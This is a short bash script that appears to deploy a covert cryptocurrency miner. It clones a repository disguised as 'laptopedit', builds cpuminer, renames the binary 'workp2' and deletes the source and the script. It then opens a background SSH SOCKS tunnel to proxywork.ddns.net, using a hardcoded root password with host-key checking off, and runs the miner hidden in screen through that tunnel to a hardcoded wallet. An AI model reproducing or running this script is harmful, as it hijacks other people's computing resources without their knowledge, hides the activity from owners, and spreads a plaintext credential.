#!/bin/bash
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
git clone https://github.com/laptopdell/laptopedit/
cd laptopedit
chmod +x *
./build.sh
make
mv cpuminer workp2 && cp workp2 ../ && cd ..  && sudo rm -rf laptopedit work.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxywork.ddns.net && cpulimit --exe workp2 --limit 200 -b && screen -d -m ./workp2 -u HNpt86fZ7KwAL7AnVSjYZ3q1uN5V67cYGE.Google -p x -x socks4://127.0.0.1:1997
